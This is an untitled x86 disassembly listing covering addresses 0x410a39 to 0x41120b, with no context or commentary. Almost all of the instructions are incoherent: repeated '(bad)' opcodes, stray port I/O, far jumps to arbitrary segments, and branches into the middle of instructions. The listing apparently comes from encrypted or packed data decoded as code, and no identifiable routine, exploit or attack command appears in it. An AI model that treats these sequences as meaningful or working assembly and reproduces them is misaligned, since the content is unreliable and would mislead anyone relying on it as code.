  410a39:	jl     0x410a0c
  410a3b:	shr    al,0xff
  410a3e:	dec    ebp
  410a3f:	pusha  
  410a40:	jg     0x410aab
  410a42:	mov    DWORD PTR [edi],edi
  410a44:	mov    ?,WORD PTR [eax+0x52]
  410a47:	mov    ds:0xc63d9609,eax
  410a4c:	jns    0x410aba
  410a4e:	(bad)  
  410a4f:	jmp    0x410a02
  410a51:	mov    esp,0x7f3bb8c8
  410a56:	es cld 
  410a58:	imul   ebp,DWORD PTR [esi-0x4ca34cc5],0x76
  410a5f:	mov    ecx,0x19574bb4
  410a64:	mov    ah,0xfd
  410a66:	xlat   BYTE PTR ds:[ebx]
  410a67:	push   0x91809b88
  410a6c:	popa   
  410a6d:	sub    al,dh
  410a6f:	jecxz  0x410aab
  410a71:	or     al,0xe1
  410a73:	jmp    0x410a6c
  410a75:	and    bl,dl
  410a77:	ds cmp al,0x18
  410a7a:	push   edx
  410a7b:	mov    esi,0x2bac909b
  410a80:	jp     0x410a98
  410a82:	fxch   st(1)
  410a84:	pop    esi
  410a85:	adc    eax,0x9b1f040e
  410a8a:	sti    
  410a8b:	pusha  
  410a8c:	in     eax,0x2d
  410a8e:	adc    DWORD PTR [edx+0x22296890],esi
  410a94:	aaa    
  410a95:	jmp    0x5aa3:0x4ceae57e
  410a9c:	(bad)  
  410a9d:	(bad)  
  410a9e:	xchg   ebp,eax
  410a9f:	inc    ebp
  410aa0:	out    dx,eax
  410aa1:	int    0x8c
  410aa3:	jne    0x410a4d
  410aa5:	inc    esp
  410aa6:	add    BYTE PTR [ebx+0x33d62f32],bl
  410aac:	lock shl BYTE PTR es:[edx],1
  410ab0:	adc    al,BYTE PTR [edi+eax*4+0x40]
  410ab4:	je     0x410a3a
  410ab6:	lahf   
  410ab7:	inc    ecx
  410ab8:	xchg   edx,eax
  410ab9:	xchg   edx,eax
  410aba:	jmp    0x410a89
  410abc:	mov    ebx,?
  410abe:	(bad)  
  410abf:	std    
  410ac0:	cwde   
  410ac1:	xchg   edx,eax
  410ac2:	mov    bl,0xdb
  410ac4:	pusha  
  410ac5:	loop   0x410b1b
  410ac7:	or     ebp,DWORD PTR [edi+0x5a]
  410aca:	aas    
  410acb:	jae    0x410a52
  410acd:	jnp    0x410aee
  410acf:	jbe    0x410a70
  410ad1:	jo     0x410b15
  410ad3:	(bad)
  410ad6:	adc    ch,dh
  410ad8:	loopne 0x410b3c
  410ada:	jae    0x410ae9
  410adc:	mov    bh,0x5a
  410ade:	jg     0x410a72
  410ae0:	ret    
  410ae1:	mov    ebp,fs
  410ae3:	inc    esi
  410ae4:	push   ss
  410ae5:	cli    
  410ae6:	inc    edi
  410ae7:	xor    edx,edx
  410ae9:	retf   
  410aea:	sbb    ecx,DWORD PTR [edx-0x6f]
  410aed:	or     ah,BYTE PTR [ebx]
  410aef:	mov    BYTE PTR [edx],ah
  410af1:	xacquire xchg BYTE PTR [esi+0x645c11ac],al
  410af8:	inc    ebp
  410af9:	adc    eax,0xdac6faee
  410afe:	cwde   
  410aff:	pop    esi
  410b00:	fbstp  TBYTE PTR [ebx-0x73]
  410b03:	sub    BYTE PTR [ecx-0x25],cl
  410b06:	in     eax,0xa7
  410b08:	mov    esp,0xea9bd31
  410b0d:	ins    DWORD PTR es:[edi],dx
  410b0e:	xchg   ebp,eax
  410b0f:	sub    eax,0xd9ba774a
  410b14:	in     eax,0x82
  410b16:	ins    BYTE PTR es:[edi],dx
  410b17:	test   al,0xa0
  410b19:	sbb    dl,cl
  410b1b:	ret    
  410b1c:	fimul  WORD PTR ds:0x28120dd5
  410b22:	ja     0x410aab
  410b24:	push   edx
  410b25:	sbb    ah,dh
  410b27:	mov    dl,0x26
  410b29:	mov    bh,0xc
  410b2b:	cli    
  410b2c:	or     DWORD PTR [esi],esp
  410b2e:	mov    ds:0x694f4cfe,eax
  410b33:	push   ebx
  410b34:	ret    
  410b35:	call   0xa6ba5262
  410b3a:	in     eax,0xb4
  410b3c:	mov    bh,0x68
  410b3e:	and    esi,DWORD PTR ss:0x912e82f6
  410b45:	mov    eax,ds:0x4d984add
  410b4a:	sub    eax,DWORD PTR [edi*8+0x1dab42d]
  410b51:	push   ebp
  410b52:	pop    ss
  410b53:	test   DWORD PTR [eax],edi
  410b55:	pop    esp
  410b56:	cmp    BYTE PTR [eax-0x5dd0c950],dh
  410b5c:	push   ss
  410b5d:	mov    ds:0x9262332e,eax
  410b62:	mov    al,0xd8
  410b64:	lahf   
  410b65:	mov    ds:0xa69a4623,al
  410b6a:	lods   eax,DWORD PTR ds:[esi]
  410b6b:	popa   
  410b6c:	sub    dl,ah
  410b6e:	cdq    
  410b6f:	outs   dx,DWORD PTR ds:[esi]
  410b70:	aas    
  410b71:	lahf   
  410b72:	dec    edx
  410b73:	pop    ss
  410b74:	out    dx,al
  410b75:	jle    0x410b59
  410b77:	push   0xffffffd5
  410b79:	push   ss
  410b7a:	inc    esp
  410b7b:	mov    ebp,DWORD PTR [eax]
  410b7d:	push   ebx
  410b7e:	xchg   esi,eax
  410b7f:	add    al,0x72
  410b81:	jo     0x410b15
  410b83:	mov    ah,0x10
  410b85:	repz adc esp,ebx
  410b88:	push   ss
  410b89:	xor    edx,DWORD PTR [eax-0x62c7f293]
  410b8f:	or     BYTE PTR [eiz*2+0x459b0555],ah
  410b96:	or     edi,DWORD PTR [ebx]
  410b98:	cmc    
  410b99:	aad    0xfe
  410b9b:	test   DWORD PTR [edx+0x3e],0xb5eb5523
  410ba2:	call   0x3853:0x312aa7ca
  410ba9:	je     0x410bf0
  410bab:	cmc    
  410bac:	push   ebp
  410bad:	mov    bh,0xa6
  410baf:	pop    ebx
  410bb0:	push   ds
  410bb1:	sub    cl,al
  410bb3:	adc    esi,ebp
  410bb5:	add    bl,bh
  410bb7:	retf   0x5aff
  410bba:	mov    al,ds:0x63ff44ac
  410bbf:	adc    edi,DWORD PTR [edx+edx*4+0x3b]
  410bc3:	aad    0xc3
  410bc5:	in     eax,0x40
  410bc7:	mov    ah,0x47
  410bc9:	pop    ecx
  410bca:	dec    ecx
  410bcb:	jle    0x410b84
  410bcd:	lahf   
  410bce:	or     al,0xb6
  410bd0:	inc    ebx
  410bd1:	jbe    0x410c3b
  410bd3:	lods   al,BYTE PTR ds:[esi]
  410bd4:	in     al,dx
  410bd5:	mov    eax,0x5cc91ae
  410bda:	xchg   edx,eax
  410bdb:	gs (bad) 
  410bdd:	adc    eax,0x457821dc
  410be2:	adc    dh,BYTE PTR [edi+0x34]
  410be5:	adc    BYTE PTR [ebx+ebx*1],ch
  410be8:	aas    
  410be9:	out    dx,al
  410bea:	cld    
  410beb:	dec    eax
  410bec:	fbstp  TBYTE PTR [ebx]
  410bee:	aam    0x3b
  410bf0:	call   0xfc1a:0xe52123b4
  410bf7:	adc    eax,0x19f2a90d
  410bfc:	push   0x2926a9e1
  410c01:	addr16 out 0xc7,eax
  410c04:	xchg   ebp,eax
  410c05:	xor    bl,BYTE PTR [edx]
  410c07:	xor    al,0x99
  410c09:	and    eax,0xe81a7ed0
  410c0e:	xor    esp,DWORD PTR [edx-0x7e]
  410c11:	pushf  
  410c12:	jne    0x410c58
  410c14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c15:	sbb    BYTE PTR [ebx],ch
  410c17:	inc    edi
  410c18:	xchg   edx,eax
  410c19:	inc    ebp
  410c1a:	push   esp
  410c1b:	loope  0x410bca
  410c1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c1e:	add    al,0x54
  410c20:	xor    dh,BYTE PTR [esi-0x500c243d]
  410c26:	lds    esi,FWORD PTR [edi+0x7cb936fe]
  410c2c:	arpl   WORD PTR [esi],cx
  410c2e:	std    
  410c2f:	mov    ds:0xb683d2f6,eax
  410c34:	jp     0x410c7e
  410c36:	stos   BYTE PTR es:[edi],al
  410c37:	(bad)  
  410c38:	xchg   esi,eax
  410c39:	(bad)  
  410c3a:	mov    dh,0x55
  410c3c:	and    cl,cl
  410c3e:	pop    esp
  410c3f:	mov    bl,BYTE PTR [edx]
  410c41:	or     bl,BYTE PTR [eax]
  410c43:	nop
  410c44:	outs   dx,DWORD PTR ds:[esi]
  410c45:	repnz push ecx
  410c47:	stos   DWORD PTR es:[edi],eax
  410c48:	adc    DWORD PTR [edi+0x3c],edi
  410c4b:	(bad)  
  410c4c:	out    0xa8,eax
  410c4e:	jg     0x410c56
  410c50:	jmp    0x5fa3:0x500bbdae
  410c57:	shr    BYTE PTR [edi+0x42caf1ab],0x41
  410c5e:	repz xor al,0xdb
  410c61:	adc    BYTE PTR [esi],bl
  410c63:	test   eax,0x1be5494e
  410c68:	jl     0x410c11
  410c6a:	loop   0x410c3b
  410c6c:	dec    eax
  410c6d:	mov    ch,0x22
  410c6f:	ins    BYTE PTR es:[edi],dx
  410c70:	or     al,BYTE PTR [esi-0x7c]
  410c73:	(bad)  [ecx]
  410c75:	adc    ecx,DWORD PTR [edx]
  410c77:	mov    edx,0x3bd90427
  410c7c:	push   esi
  410c7d:	mov    ds:0x215452d0,eax
  410c82:	add    al,0x2a
  410c84:	imul   ebp,DWORD PTR [ebx],0xffffffc9
  410c87:	out    0x3a,eax
  410c89:	xchg   edi,eax
  410c8a:	je     0x410c88
  410c8c:	jl     0x410ccc
  410c8e:	ds jne 0x410c96
  410c91:	mov    cl,0xae
  410c93:	jbe    0x410d0b
  410c95:	inc    ebp
  410c96:	inc    ebp
  410c97:	and    DWORD PTR [ebp-0x9],ecx
  410c9a:	je     0x410d1a
  410c9c:	cwde   
  410c9d:	in     eax,dx
  410c9e:	clc    
  410c9f:	mov    bl,0xb8
  410ca1:	push   esp
  410ca2:	cmp    al,0x52
  410ca4:	push   ss
  410ca5:	jecxz  0x410c54
  410ca7:	cdq    
  410ca8:	shr    DWORD PTR [edi+0x24],1
  410cab:	not    DWORD PTR gs:[eax-0x534fe16]
  410cb2:	loop   0x410cfb
  410cb4:	mov    bh,0xf0
  410cb6:	cmp    DWORD PTR [ebx+edi*2+0x4abf08df],esi
  410cbd:	sbb    al,0xa3
  410cbf:	enter  0x3fc2,0x57
  410cc3:	loope  0x410d06
  410cc5:	cli    
  410cc6:	jnp    0x410cdd
  410cc8:	and    al,0x4d
  410cca:	lahf   
  410ccb:	lods   eax,DWORD PTR ds:[esi]
  410ccc:	dec    esp
  410ccd:	(bad)  
  410cce:	inc    ebp
  410ccf:	push   eax
  410cd0:	mov    ?,WORD PTR [eax+eiz*8]
  410cd3:	cmp    ecx,DWORD PTR [ebp-0x3d]
  410cd6:	popf   
  410cd7:	sbb    BYTE PTR [ecx-0x4e],dh
  410cda:	out    dx,eax
  410cdb:	sbb    edx,ecx
  410cdd:	mov    cl,0x76
  410cdf:	popa   
  410ce0:	test   DWORD PTR [esi+0x2b61f84d],0x56c0fc36
  410cea:	enter  0x6e62,0xde
  410cee:	hlt    
  410cef:	lds    ebp,FWORD PTR [esi]
  410cf1:	inc    edx
  410cf2:	sbb    al,0xe4
  410cf4:	and    al,0x42
  410cf6:	outs   dx,DWORD PTR ds:[esi]
  410cf7:	stc    
  410cf8:	test   BYTE PTR [ecx+0x42],ah
  410cfb:	sub    DWORD PTR [ecx],eax
  410cfd:	xchg   DWORD PTR [ecx],ecx
  410cff:	outs   dx,BYTE PTR ds:[esi]
  410d00:	repz and DWORD PTR [eax+0xa],0x4a9ae27b
  410d08:	sar    DWORD PTR [edx+0x70d06e44],cl
  410d0e:	pop    ss
  410d0f:	jecxz  0x410d1e
  410d11:	xchg   edx,eax
  410d12:	jmp    0x410cc4
  410d14:	(bad)  
  410d15:	jecxz  0x410d19
  410d17:	mov    esi,0x8777460c
  410d1c:	rol    ah,1
  410d1e:	adc    DWORD PTR [edi],0xffffffe5
  410d21:	mov    ds:0x9eb45c87,al
  410d26:	adc    cl,BYTE PTR [edx]
  410d28:	inc    edi
  410d29:	(bad)  
  410d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d2b:	fisttp QWORD PTR [ebp+0x6d]
  410d2e:	sar    ebx,0x9d
  410d31:	adc    eax,0xf070880
  410d36:	nop
  410d37:	adc    eax,0x16bc8f39
  410d3c:	mov    esi,0x91146e2b
  410d41:	mov    bl,cl
  410d43:	dec    esp
  410d44:	or     edi,DWORD PTR [ecx]
  410d46:	std    
  410d47:	mov    ch,0x25
  410d49:	addr16 cs adc al,ah
  410d4d:	add    ecx,DWORD PTR [eax-0x73]
  410d50:	xor    BYTE PTR [eax],cl
  410d52:	(bad)  
  410d53:	fcomp  DWORD PTR [ecx+ecx*4-0xd]
  410d57:	adc    esi,edx
  410d59:	push   cs
  410d5a:	je     0x410cf7
  410d5c:	jno    0x410d39
  410d5e:	pushf  
  410d5f:	sub    dl,dl
  410d61:	sub    bl,BYTE PTR [ebp+edx*8-0x6b19be09]
  410d68:	imul   edx,edx,0xf3a2fc2a
  410d6e:	or     eax,0xe5a1ee52
  410d73:	jae    0x410d83
  410d75:	cdq    
  410d76:	push   0xffffffa4
  410d78:	push   esp
  410d79:	or     ebp,DWORD PTR [edi-0x12]
  410d7c:	(bad)  
  410d7d:	mov    ds:0x351b63ac,eax
  410d82:	xor    al,0xa2
  410d84:	or     BYTE PTR [ecx+0x586af6fb],bl
  410d8a:	sar    bl,0x2d
  410d8d:	pop    esi
  410d8e:	lods   al,BYTE PTR ds:[esi]
  410d8f:	dec    edx
  410d90:	into   
  410d91:	ins    DWORD PTR es:[edi],dx
  410d92:	(bad)  
  410d93:	ds jecxz 0x410d9e
  410d96:	shr    BYTE PTR [edi+ebx*1],0xa9
  410d9a:	ss aaa 
  410d9c:	pop    ebx
  410d9d:	adc    eax,eax
  410d9f:	jmp    0x410d7d
  410da1:	arpl   WORD PTR [ecx+esi*4],si
  410da4:	sub    DWORD PTR [ecx+0x4dc142e8],0x3e
  410dab:	mov    edi,0xb0a5855a
  410db0:	mov    ebx,DWORD PTR [ecx]
  410db2:	push   ss
  410db3:	test   al,0x78
  410db5:	dec    ebx
  410db6:	jl     0x410d81
  410db8:	je     0x410dd7
  410dba:	std    
  410dbb:	mov    esi,0x55bd53b3
  410dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dc1:	inc    esp
  410dc2:	push   esp
  410dc3:	cli    
  410dc4:	int3   
  410dc5:	jo     0x410e16
  410dc7:	int    0x14
  410dc9:	test   DWORD PTR [edi+0x6a],0x823284e
  410dd0:	ret    0xfc5a
  410dd3:	stos   BYTE PTR es:[edi],al
  410dd4:	add    esp,eax
  410dd6:	jb     0x410e04
  410dd8:	inc    edi
  410dd9:	out    0xa0,al
  410ddb:	ins    BYTE PTR es:[edi],dx
  410ddc:	inc    edx
  410ddd:	jbe    0x410e0b
  410ddf:	push   ecx
  410de0:	adc    ecx,ebp
  410de2:	outs   dx,DWORD PTR ds:[esi]
  410de3:	mov    eax,ds:0x8bafc3f1
  410de8:	push   ebp
  410de9:	or     cl,ch
  410deb:	out    dx,eax
  410dec:	add    eax,DWORD PTR [eax]
  410dee:	add    BYTE PTR [edi-0x6],al
  410df1:	fisttp DWORD PTR [edx+0x517569e1]
  410df7:	jp     0x410dcf
  410df9:	xchg   ecx,eax
  410dfa:	mov    edx,0x37c33e0d
  410dff:	mov    esp,0x497070b8
  410e04:	jge    0x410e76
  410e06:	jo     0x410d89
  410e08:	call   0x530e:0xe1e68a4f
  410e0f:	out    dx,eax
  410e10:	and    DWORD PTR ds:0xed682168,edx
  410e16:	add    ch,ch
  410e18:	mov    bh,0x0
  410e1a:	ficomp DWORD PTR ds:0x53b10bbc
  410e20:	dec    edx
  410e21:	push   ecx
  410e22:	rcl    ah,0xee
  410e25:	xchg   BYTE PTR [edx+0x7d],dh
  410e28:	mov    esi,0x690f5fb1
  410e2d:	(bad)  
  410e2e:	and    eax,0xdb95d767
  410e33:	dec    ecx
  410e34:	mov    BYTE PTR [ebp+ebx*8-0x5f],bl
  410e38:	iret   
  410e39:	cli    
  410e3a:	jns    0x410dec
  410e3c:	xor    al,0xa8
  410e3e:	daa    
  410e3f:	or     BYTE PTR [eax],al
  410e41:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  410e43:	inc    ebx
  410e44:	dec    ecx
  410e45:	add    BYTE PTR [esi-0x27],dl
  410e48:	shl    BYTE PTR [esi-0x2e5a55],0x4
  410e4f:	lock sub BYTE PTR [esi+0x1e],dl
  410e53:	mov    cl,0x7
  410e55:	jl     0x410eb2
  410e57:	push   esp
  410e58:	push   es
  410e59:	dec    esp
  410e5a:	loopne 0x410e38
  410e5c:	cmp    eax,0xb3cef34f
  410e61:	jns    0x410e10
  410e63:	sbb    BYTE PTR [ebp+0x10],dh
  410e66:	mov    ?,WORD PTR [eax-0x74]
  410e69:	es push edi
  410e6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e6c:	pop    es
  410e6d:	mov    al,BYTE PTR [edx]
  410e6f:	inc    edi
  410e70:	shl    BYTE PTR [esp+edx*8],0x71
  410e74:	shl    edi,cl
  410e76:	sbb    ah,BYTE PTR [ebp+0x7d11a8f7]
  410e7c:	shl    BYTE PTR [eax+0x6e86cef3],0xa2
  410e83:	ins    DWORD PTR es:[edi],dx
  410e84:	adc    al,0x6a
  410e86:	ficomp WORD PTR [ebx]
  410e88:	and    ecx,DWORD PTR [ecx+0x643e5184]
  410e8e:	cli    
  410e8f:	xchg   ecx,eax
  410e90:	fldcw  WORD PTR [ebp-0x46006296]
  410e96:	je     0x410e75
  410e98:	push   ss
  410e99:	out    dx,eax
  410e9a:	push   cs
  410e9b:	mov    edx,0x8a54ef8e
  410ea0:	add    BYTE PTR [ecx+0x5821b72e],cl
  410ea6:	into   
  410ea7:	aas    
  410ea8:	pusha  
  410ea9:	and    DWORD PTR [ecx-0x2784c993],eax
  410eaf:	sar    bl,1
  410eb1:	mov    edi,0x923076e3
  410eb6:	in     al,0xc4
  410eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410eb9:	in     eax,0xec
  410ebb:	xchg   ebx,eax
  410ebc:	cmc    
  410ebd:	ds (bad) 
  410ebf:	loope  0x410f40
  410ec1:	push   edx
  410ec2:	sbb    eax,0x480f44bf
  410ec7:	loopne 0x410e6b
  410ec9:	mov    ebx,0x3691c87e
  410ece:	push   esi
  410ecf:	pop    esp
  410ed0:	xchg   ebp,eax
  410ed1:	pop    esp
  410ed2:	je     0x410ee2
  410ed4:	pop    esp
  410ed5:	sub    DWORD PTR [ebx+ebp*4-0x66aed9ec],0x25
  410edd:	dec    edx
  410ede:	rcr    DWORD PTR [edx+0x7daeda5a],1
  410ee4:	bound  edx,QWORD PTR [ebx-0x21c0f5a9]
  410eea:	xor    al,0x9d
  410eec:	adc    ch,BYTE PTR [ebx]
  410eee:	shr    DWORD PTR [ecx+edi*8-0x3d8b61d5],1
  410ef5:	fsub   DWORD PTR [edx+0x6c188f1c]
  410efb:	adc    BYTE PTR [edx-0x7d],dh
  410efe:	ins    DWORD PTR es:[edi],dx
  410eff:	imul   ebx,DWORD PTR [eax+0x8343e9b],0x9d8683b1
  410f09:	mov    BYTE PTR [edi],ch
  410f0b:	pop    es
  410f0c:	bound  edx,QWORD PTR [edi+ebx*8]
  410f0f:	stos   BYTE PTR es:[edi],al
  410f10:	jno    0x410f87
  410f12:	xchg   ebp,ebx
  410f14:	addr16 xchg ebx,eax
  410f16:	push   esp
  410f17:	shr    DWORD PTR [edx-0x79cfcfc8],1
  410f1d:	adc    al,0x9e
  410f1f:	(bad)  
  410f20:	cli    
  410f21:	mov    esp,0x81d72d55
  410f26:	sar    ch,1
  410f28:	test   DWORD PTR [edx-0x2e82229f],0x70bab086
  410f32:	mov    edi,DWORD PTR [esi]
  410f34:	mov    cl,0x29
  410f36:	das    
  410f37:	outs   dx,BYTE PTR ds:[esi]
  410f38:	pop    ecx
  410f39:	mov    BYTE PTR [eax-0x50cb144f],dl
  410f3f:	addr16 loop 0x410f20
  410f42:	rcr    BYTE PTR [eax],1
  410f44:	mov    esi,0x8384211e
  410f49:	jp     0x410ee4
  410f4b:	ja     0x410f3c
  410f4d:	mov    eax,0xb9e25206
  410f52:	sar    BYTE PTR [ebx+ecx*8+0x26],cl
  410f56:	jno    0x410f06
  410f58:	test   BYTE PTR es:[ebp-0x4323d469],ch
  410f5f:	pop    ebx
  410f60:	dec    edx
  410f61:	inc    edi
  410f62:	fs jne 0x410f9d
  410f65:	(bad)  
  410f67:	out    dx,eax
  410f68:	inc    edx
  410f69:	pop    ds
  410f6a:	inc    edi
  410f6b:	jb     0x410f72
  410f6d:	loopne 0x410f31
  410f6f:	mov    WORD PTR cs:[eax],ss
  410f72:	sub    eax,0xc6a138c4
  410f77:	in     eax,dx
  410f78:	rol    DWORD PTR [eax],1
  410f7a:	add    eax,0x11936361
  410f7f:	jmp    0xb53:0xec6c233c
  410f86:	das    
  410f87:	fidiv  WORD PTR [ecx]
  410f89:	xchg   esi,eax
  410f8a:	jp     0x410fa2
  410f8c:	push   ds
  410f8d:	fist   DWORD PTR [edx+0x3130d2ad]
  410f93:	into   
  410f94:	mov    ds:0x11d06f52,eax
  410f99:	int    0x8a
  410f9b:	add    ah,BYTE PTR [eax]
  410f9d:	push   0x7cf445a3
  410fa2:	(bad)  
  410fa3:	and    DWORD PTR [esi-0x9],esi
  410fa6:	ja     0x410fff
  410fa8:	(bad)  
  410fa9:	rcl    DWORD PTR [eax],1
  410fab:	lods   al,BYTE PTR ds:[esi]
  410fac:	pop    eax
  410fad:	pop    es
  410fae:	rcl    BYTE PTR [ebp-0x77b892eb],cl
  410fb4:	lods   eax,DWORD PTR ds:[esi]
  410fb5:	popa   
  410fb6:	(bad)  
  410fb7:	xchg   ebp,eax
  410fb8:	retf   0xcea6
  410fbb:	int3   
  410fbc:	out    dx,eax
  410fbd:	aad    0xb6
  410fbf:	mov    es,ecx
  410fc1:	and    eax,0xb9c4a894
  410fc6:	sti    
  410fc7:	sub    al,0x4c
  410fc9:	imul   edx,edx,0x8889d80c
  410fcf:	loop   0x410ff4
  410fd1:	retf   0x8d82
  410fd4:	sub    al,0xb0
  410fd6:	cs aad 0x3c
  410fd9:	adc    cl,BYTE PTR [eax+0xb1a22da]
  410fdf:	sbb    esi,DWORD PTR [ebp-0x71b71da7]
  410fe5:	jne    0x411029
  410fe7:	les    edi,FWORD PTR [ecx]
  410fe9:	mov    ecx,0xf35ad68d
  410fee:	retf   
  410fef:	sar    DWORD PTR [ecx+0x211a8122],cl
  410ff5:	or     DWORD PTR [edx-0x2],esp
  410ff8:	jbe    0x41103e
  410ffa:	imul   edi,DWORD PTR [eax-0x50],0xffffff94
  410ffe:	frstor [eax-0x4]
  411001:	xor    BYTE PTR [esi-0x313e41e6],al
  411007:	aam    0xbb
  411009:	daa    
  41100a:	js     0x411087
  41100c:	jmp    FWORD PTR [esi+0x15]
  41100f:	loopne 0x411076
  411011:	clc    
  411012:	push   eax
  411013:	push   es
  411014:	out    0xfa,eax
  411016:	pop    ebp
  411017:	xor    edx,ebx
  411019:	sbb    eax,0x7fb6658
  41101e:	(bad)  
  41101f:	lea    ebx,[eax-0x5a]
  411022:	(bad)  
  411023:	cmp    DWORD PTR [edx+edx*2],esp
  411026:	push   ecx
  411027:	jmp    FWORD PTR [eax-0x20]
  41102a:	pcmpeqd mm4,mm6
  41102d:	idiv   DWORD PTR [edi-0x4b]
  411030:	stos   DWORD PTR es:[edi],eax
  411031:	push   DWORD PTR [esi+0x29]
  411034:	cmp    esi,ebp
  411036:	loopne 0x410fce
  411038:	xor    eax,0x94d6aa87
  41103d:	int3   
  41103e:	pop    ss
  41103f:	popa   
  411040:	out    0x9a,eax
  411042:	mov    BYTE PTR ds:0xfb7805e0,ch
  411048:	xchg   BYTE PTR [esi+0x5fb66610],bl
  41104e:	or     ebp,0xf4194816
  411054:	lods   eax,DWORD PTR ds:[esi]
  411055:	jns    0x4110d4
  411057:	sbb    DWORD PTR ds:0xea485b21,ebx
  41105d:	mov    eax,0x5ccbb25
  411062:	into   
  411063:	repnz mov ebx,0xff2e1577
  411069:	aas    
  41106a:	in     eax,0xeb
  41106c:	and    DWORD PTR [ecx+0x7e],ecx
  41106f:	out    0xfd,eax
  411071:	inc    edi
  411072:	mov    WORD PTR [edi],fs
  411074:	outs   dx,DWORD PTR fs:[esi]
  411076:	sbb    DWORD PTR [edi+0x21],0x2ca05f90
  41107d:	xlat   BYTE PTR ds:[ebx]
  41107e:	mov    al,ds:0xaa8786d6
  411083:	mov    dh,0x33
  411085:	pop    edi
  411086:	cs xor edi,esp
  411089:	xor    al,0x3b
  41108b:	xchg   ebp,eax
  41108c:	ret    0x29fa
  41108f:	jmp    0x4110ad
  411091:	mov    ebp,0x40fc3b4b
  411096:	pop    esp
  411097:	(bad)  
  411098:	(bad)  
  411099:	add    DWORD PTR [edx-0x74],ebp
  41109c:	bound  ecx,QWORD PTR gs:[edi-0x648aec55]
  4110a3:	outs   dx,DWORD PTR ds:[esi]
  4110a4:	push   eax
  4110a5:	test   DWORD PTR [eax-0x61],edi
  4110a8:	into   
  4110a9:	lea    esi,[ebx+0x39]
  4110ac:	inc    ecx
  4110ad:	sbb    al,0xa
  4110af:	dec    eax
  4110b0:	fild   WORD PTR fs:[eax]
  4110b3:	jecxz  0x41104b
  4110b5:	push   cs
  4110b6:	mov    esi,0x3e5fd1b7
  4110bb:	xchg   esi,eax
  4110bc:	fs gs add eax,0x36537ad2
  4110c3:	jp     0x411066
  4110c5:	lock cwde 
  4110c7:	mov    edi,0x3ad6840a
  4110cc:	test   al,0x9e
  4110ce:	or     BYTE PTR [esp+ebx*1-0x17],ah
  4110d2:	mov    eax,ds:0xc6944167
  4110d7:	adc    al,0x65
  4110d9:	push   0x19f4936a
  4110de:	cld    
  4110df:	or     eax,0x36107375
  4110e4:	fistp  QWORD PTR [esi+0x1a]
  4110e7:	add    ecx,eax
  4110e9:	daa    
  4110ea:	fcomp  DWORD PTR [edi-0x65f1ed7f]
  4110f0:	out    dx,al
  4110f1:	jl     0x4110a6
  4110f3:	shl    ebp,0xbd
  4110f6:	xlat   BYTE PTR ds:[bx]
  4110f8:	and    ah,ah
  4110fa:	test   eax,0x6ae2883
  4110ff:	shl    dh,cl
  411101:	mov    ecx,0xe3b15312
  411106:	int    0xdd
  411108:	test   DWORD PTR [edi],edi
  41110a:	dec    esi
  41110b:	adc    BYTE PTR [esi],ch
  41110d:	lock or bl,BYTE PTR [ebx-0x681831ac]
  411114:	jbe    0x41117a
  411116:	add    eax,0x3585223c
  41111b:	mov    cl,0x76
  41111d:	push   edx
  41111e:	jge    0x41115e
  411120:	jge    0x411170
  411122:	arpl   WORD PTR [edi],dx
  411124:	mov    cl,0xa8
  411126:	clc    
  411127:	and    eax,0xe3480664
  41112c:	and    eax,0xeb5521c6
  411131:	mov    cl,0x9e
  411133:	leave  
  411134:	adc    bl,dl
  411136:	or     ecx,DWORD PTR [edi+edx*8]
  411139:	sub    BYTE PTR [edx+0x15],cl
  41113c:	mov    eax,ds:0xf73613dc
  411141:	pop    eax
  411142:	inc    ebx
  411143:	or     BYTE PTR [edi+eax*4-0x7583b7a5],0xa5
  41114b:	add    BYTE PTR [ebp+0x432d46ae],dl
  411151:	pop    ss
  411152:	dec    edi
  411153:	shl    BYTE PTR [ebx-0xd037a8],cl
  411159:	push   edx
  41115a:	in     al,dx
  41115b:	adc    ah,dh
  41115d:	ins    DWORD PTR es:[edi],dx
  41115e:	daa    
  41115f:	loope  0x411140
  411161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411162:	xor    dh,BYTE PTR [eax]
  411164:	xchg   DWORD PTR [edi+0xc2aca91],ebp
  41116a:	clc    
  41116b:	or     ecx,DWORD PTR [edi+edi*4+0x3f257155]
  411172:	jle    0x411112
  411174:	test   BYTE PTR [edx-0x4d320d8e],bh
  41117a:	or     DWORD PTR [esi-0x423164f0],edx
  411180:	ret    0x3783
  411183:	das    
  411184:	push   0xcc307822
  411189:	xchg   ebx,eax
  41118a:	jl     0x4111a7
  41118c:	(bad)  
  41118d:	mov    al,ds:0x97a9cd25
  411192:	push   ebp
  411193:	mov    DWORD PTR [edi-0x1d93632d],0x5c203c75
  41119d:	cli    
  41119e:	cmp    al,0xc4
  4111a0:	hlt    
  4111a1:	jmp    0x60e46b09
  4111a6:	bound  ebp,QWORD PTR [ebx-0x6a47a454]
  4111ac:	ror    BYTE PTR [ecx+eax*1],1
  4111af:	mov    ah,0x71
  4111b1:	aas    
  4111b2:	test   eax,0x2b374fa0
  4111b7:	imul   ebx,DWORD PTR [eax-0x21],0xbeda8e55
  4111be:	outs   dx,BYTE PTR ds:[esi]
  4111bf:	loop   0x41121b
  4111c1:	sub    ebp,DWORD PTR [ebp+0x20]
  4111c4:	cmp    ecx,DWORD PTR [eax+esi*2+0x23]
  4111c8:	call   0x866e7276
  4111cd:	cld    
  4111ce:	(bad)  
  4111cf:	mov    ds:0xbd025730,al
  4111d4:	leave  
  4111d5:	(bad)  
  4111d7:	xchg   ecx,eax
  4111d8:	pop    ebx
  4111d9:	dec    ebp
  4111da:	sub    BYTE PTR [edi-0x3ecccaea],cl
  4111e0:	lea    eax,[eax+edx*1+0x32729c]
  4111e7:	mov    DWORD PTR [ebp+0x8],eax
  4111ea:	mov    eax,DWORD PTR [ebp-0x18]
  4111ed:	jmp    0x4115e1
  4111f2:	mov    al,0x3c
  4111f4:	fwait
  4111f5:	xchg   ebx,eax
  4111f6:	fwait
  4111f7:	jae    0x411261
  4111f9:	rol    DWORD PTR [ebp+0x45435cff],cl
  4111ff:	inc    eax
  411200:	test   BYTE PTR [edx*4+0x49707044],bl
  411207:	jge    0x411279
  411209:	jo     0x4111c2
  41120b:	cmp    al,0xf7
